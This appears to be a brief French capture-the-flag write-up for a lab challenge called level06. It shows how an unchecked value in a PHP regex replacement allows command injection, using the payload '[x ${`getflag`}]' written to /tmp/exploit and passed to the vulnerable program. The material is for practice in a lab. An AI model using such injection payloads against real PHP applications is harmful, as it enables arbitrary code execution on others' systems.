echo '[x ${`getflag`}]' >  /tmp/exploit

cat /tmp/exploit

./level06 /tmp/exploit

mettre le .php dans un reverce php (sur internet)

voir que x est remplacer par un . mais n'est jamais check et que y utilise le resultat de x, du coup si il y a une erreur nous pouvons injecter du code directement dans la focntion y, par exemple avec le code [x ${`getflag`}]

echo '[x ${`getflag`}]' >  /tmp/exploit

regardon que notre fichier c'est bien créer 

cat /tmp/exploit

puis lancons notre programme 

./level06 /tmp/exploit